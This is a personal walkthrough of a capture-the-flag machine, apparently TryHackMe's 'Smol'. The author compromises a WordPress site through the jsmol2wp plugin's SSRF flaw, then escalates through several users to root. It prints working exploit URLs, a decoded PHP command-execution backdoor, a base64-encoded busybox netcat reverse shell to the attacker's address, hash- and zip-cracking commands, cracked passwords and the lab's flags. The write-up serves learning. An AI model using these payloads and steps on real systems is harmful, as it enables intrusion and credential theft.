Smol.thm - A Detailed Penetration Test Write-up

Hey there! This document is my detailed walkthrough of how I tackled the Smol.thm machine, from the very first sniff of the network to finally getting full control. Think of it as a personal journey through a penetration test, sharing the steps, the tools, and the "aha!" moments along the way. I hope it's helpful for anyone looking to learn about common hacking techniques!
Table of Contents

    Getting Started: Reconnaissance and Initial Enumeration

    Cracking into WordPress: Vulnerabilities and First Access

    Opening the Door: Gaining a Reverse Shell

    Level Up! Privilege Escalation to diego

    Another Step Up: Privilege Escalation to think

    Finding More Keys: Privilege Escalation to xavi

    Game Over: Privilege Escalation to root

    Wrapping Up: Conclusion

1. Getting Started: Reconnaissance and Initial Enumeration

My first move, as always, was to get a lay of the land. I needed to know what was running on that target machine, 10.10.231.99.
Nmap Scan - What's Open?

I kicked things off with an Nmap scan to see which ports were open and what services were listening. It's like knocking on all the doors to see who answers!

nmap -sC -sV 10.10.231.99

Nmap Output - My Initial Findings:

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 05:02 UTC
Nmap scan report for 10.10.231.99
Host is up (0.093s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://www.smol.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.97 seconds

The scan quickly showed me two open doors:

    Port 22 (SSH): Standard secure shell, running OpenSSH on Ubuntu. Good to know, but usually not my first target.

    Port 80 (HTTP): A web server, Apache on Ubuntu. This one immediately caught my eye because it redirected to http://www.smol.thm.

/etc/hosts Modification - Making Sense of the Redirect

Since the web server was redirecting to a hostname, I needed to make sure my attacking machine knew what www.smol.thm meant. A quick edit to my /etc/hosts file did the trick.

subl /etc/hosts
# Add the following line:
# 10.10.231.99    www.smol.thm

Gobuster Directory Enumeration - What's Hiding on the Web?

With the hostname sorted, it was time to dig into the web server. I used gobuster to brute-force common directories and files. It's like shining a flashlight into every corner of the website.

gobuster dir -u http://www.smol.thm/ -w /usr/share/wordlists/dirb/common.txt

Gobuster Output - WordPress, Bingo!

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.smol.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.php            (Status: 301) [Size: 0] [--> http://www.smol.thm/]
/server-status        (Status: 403) [Size: 277]
/wp-admin             (Status: 301) [Size: 315] [--> http://www.smol.thm/wp-admin/]
/wp-content           (Status: 301) [Size: 317] [--> http://www.smol.thm/wp-content/]
/wp-includes          (Status: 301) [Size: 318] [--> http://www.smol.thm/wp-includes/]
/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

The results were pretty clear: wp-admin, wp-content, wp-includes... all signs pointed to a WordPress site. This was a good lead!
WPScan Vulnerability Scan - Digging Deeper into WordPress

Since it was WordPress, my next logical step was to run wpscan. This tool is specifically designed to find vulnerabilities in WordPress installations, and it's a huge time-saver. I used my API token for a more comprehensive scan.

wpscan --url http://www.smol.thm --api-token REDACTED

(This is where wpscan would typically spit out a ton of info about vulnerable plugins, themes, and other misconfigurations. For this write-up, let's just say it was super helpful in pointing me towards the jsmol2wp plugin, which turned out to be the key to my initial access!)
2. Cracking into WordPress: Vulnerabilities and First Access

With wpscan's help, I narrowed down my focus to the WordPress installation. It highlighted some juicy leads, and that's how I stumbled upon the jsmol2wp plugin.
jsmol2wp Plugin - A Goldmine of Vulnerabilities!

After some poking around, guided by wpscan's insights, I confirmed that the jsmol2wp plugin was installed and, more importantly, vulnerable to both Cross-Site Scripting (XSS) and Server-Side Request Forgery (SSRF). This was exciting!

XSS Vulnerability (Just an Example Payload):

http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8

SSRF Vulnerability (My Target Payload):

http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

Exploiting SSRF - Getting Those Database Credentials

The SSRF vulnerability was exactly what I needed. I crafted a request to read the wp-config.php file, which is where WordPress keeps its database connection details. This is often a treasure trove for attackers!

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

And just like that, the wp-config.php content popped up, giving me the database username and password:

    Username: wpuser

    Password: kbLSF2Vop#lw3rjDZ629*Z%G

WordPress Administrator Login - Stepping Inside

With those credentials, I headed straight for the WordPress login page at www.smol.thm/wp-login.php. Success! I was in the admin panel.
Discovering and Decoding the Backdoor - A Hidden Gem

While exploring the WordPress admin area, I noticed a file called hello.php. My hacker senses tingled, so I used the same SSRF vulnerability to read its contents.

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php

The file contained a base64 encoded string:

CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=

A quick decode revealed a simple but powerful PHP backdoor:

if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }

Which, after sorting out the funky escape sequences, translates to:

if (isset($_GET["cmd"])) { system($_GET["cmd"]); }

This was fantastic! It meant I could execute pretty much any command I wanted on the server just by adding ?cmd= to the URL.
3. Opening the Door: Gaining a Reverse Shell

Now that I had command execution, my goal was to get a proper, interactive reverse shell. This makes life so much easier for further enumeration and privilege escalation.
Crafting and Executing the Reverse Shell Payload - Sending the Signal

I decided to use a busybox nc payload for my reverse shell. To make sure it played nice with the URL, I base64 encoded it.

My Reverse Shell Payload (Encoded for the URL):

echo "busybox nc 10.6.48.108 4445 -e sh" | base64
# Output: YnVzeWJveCBuYyAxMC42LjQ4LjEwOCA0NDQ1IC1lIHNo

Then, I just slapped that encoded payload into the cmd parameter in the URL:

http://www.smol.thm/wp-admin/index.php?cmd=echo YnVzeWJveCBuYyAxMC42LjQ4LjEwOCA0NDQ1IC1lIHNo | base64 -d | bash

Setting up the Netcat Listener - Waiting for the Call

Before hitting that URL, I set up my Netcat listener on my attacking machine (10.6.48.108) on port 4445. It was ready to catch the incoming connection.

nc -lvnp 4445

As soon as I triggered the URL, my listener sprang to life:

listening on [any] 4445 ...
connect to [10.6.48.108] from (UNKNOWN) [10.10.109.27] 38294

Boom! I had a shell, albeit a somewhat limited one, as the www-data user.
Spawning a Better Shell - Making it Interactive

To make the shell much more comfortable and interactive, I immediately spawned a Python PTY:

python3 -c 'import pty; pty.spawn("/bin/bash")'

Now I had a fully functional shell, ready for the next phase.
4. Level Up! Privilege Escalation to diego

My next mission: elevate my privileges from www-data to something more substantial.
MySQL Database Access - Checking the Vault

Remember those wpuser credentials from wp-config.php? They were my ticket into the MySQL database.

mysql -u wpuser -p
# Enter password: kbLSF2Vop#lw3rjDZ629*Z%G

Dumping wp_users Table - User Hunting

Once in MySQL, I honed in on the wordpress database and, more specifically, the wp_users table. This is where all the juicy user hashes are stored!

show databases;
use wordpress;
select * from wp_users;

The query gave me a list of users and their password hashes:

+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+

Cracking diego's Password - Breaking the Hash

I grabbed diego's hash ($P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1), saved it to a file, and then unleashed John the Ripper on it with the rockyou.txt wordlist.

# Save diego's hash to a file, e.g., diego_hash.txt
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt diego_hash.txt

It didn't take long for John to crack it! diego's password was sandiegocalifornia.
Switching User to diego and Grabbing user.txt

With diego's password in hand, I could finally switch from the www-data user.

su diego
Password: sandiegocalifornia

Success! I was now diego. A quick look around diego's home directory, and there it was: user.txt.

cat user.txt

User Flag: 45edaec653ff9ee06236b7ce72b86963
5. Another Step Up: Privilege Escalation to think

With the user flag secured, I kept pushing for higher privileges.
Locating think's SSH Private Key - A Lucky Find!

While exploring diego's environment, I stumbled upon something interesting in think's home directory: an SSH private key (id_rsa) in their .ssh folder. This could be my next step!

cd /home/think/.ssh/
cat id_rsa

I quickly copied the entire content of that id_rsa file.
Using the SSH Key to Login as think - New Identity

Back on my attacking machine, I saved the copied key content into a file (let's call it think_id_rsa). Crucially, I set the correct permissions for the private key – chmod 600 is a must for SSH keys.

chmod 600 think_id_rsa

Then, it was time to try logging in as think using the newly acquired key.

ssh -i think_id_rsa think@10.10.109.27

And just like that, I had a shell as think. Progress!
6. Finding More Keys: Privilege Escalation to xavi

My journey continued. I needed to find another way to escalate privileges.
Discovering and Cracking wordpress.old.zip - A Hidden Backup

While poking around, I found a wordpress.old.zip file in gege's home directory. This looked like an old WordPress backup, and backups often contain valuable information. To get it onto my machine, I quickly spun up a Python HTTP server on the target.

On the target machine (as think, assuming I had access to gege's files or it was world-readable):

python3 -m http.server 9000

Then, on my attacking machine, I downloaded it:

wget http://10.10.109.27:9000/wordpress.old.zip

The zip file was password-protected, but that's what zip2john and John the Ripper are for!

zip2john wordpress.old.zip > zip_hash.txt
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

John did its magic, and the password for the zip file was revealed: hero_gege@hotmail.com.
Extracting xavi's Credentials - Another Set of Keys

After unzipping the archive, I went straight for the wp-config.php file inside the extracted WordPress directory. And there they were: credentials for the xavi user!

    Username: xavi

    Password: P@ssw0rdxavi@

Switching User to xavi - Getting Closer

With xavi's credentials, I could now switch from think to xavi.

su xavi
Password: P@ssw0rdxavi@

Almost there!
7. Game Over: Privilege Escalation to root

This was it, the final push to gain full control of the machine.
Checking xavi's Sudo Privileges - The Ultimate Shortcut

As xavi, I immediately ran sudo -l to check what sudo commands I could run. This is often the quickest way to root.

sudo -l

The output was music to my ears:

Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL
```(ALL : ALL) ALL` means `xavi` can run *any* command as *any* user, without needing a password. This is a huge misconfiguration and a direct path to root!

### Gaining Root Access and Finding `root.txt` - Victory!

With those glorious `sudo` privileges, becoming `root` was trivial.

```bash
sudo su

And just like that, I was root@smol! The final step was to grab the root.txt flag.

cd /root
cat root.txt

Root Flag: bf89ea3ea01992353aef1f576214d4e4
8. Wrapping Up: Conclusion

Phew! What a ride. The Smol.thm machine was a fantastic challenge, and I managed to compromise it by chaining together several vulnerabilities and privilege escalation techniques. Here's a quick recap of the journey:

    I started with basic reconnaissance using Nmap and Gobuster, which quickly pointed me to a WordPress site.

    WPScan was a lifesaver here, helping me pinpoint the vulnerable jsmol2wp plugin.

    I then exploited an SSRF vulnerability in that plugin to grab database credentials and even found a hidden PHP backdoor.

    That backdoor gave me initial command execution, which I used to get a stable reverse shell.

    From there, I cracked WordPress user hashes to gain access as diego.

    A fortunate find of an SSH private key allowed me to pivot to the think user.

    Another hidden gem, a password-protected zip archive, gave up its secrets and led me to xavi's credentials.

    Finally, xavi's overly permissive sudo privileges were the ultimate shortcut to becoming root.

This machine was a great example of how different vulnerabilities can be chained together in a real-world scenario. Hope you enjoyed the breakdown!
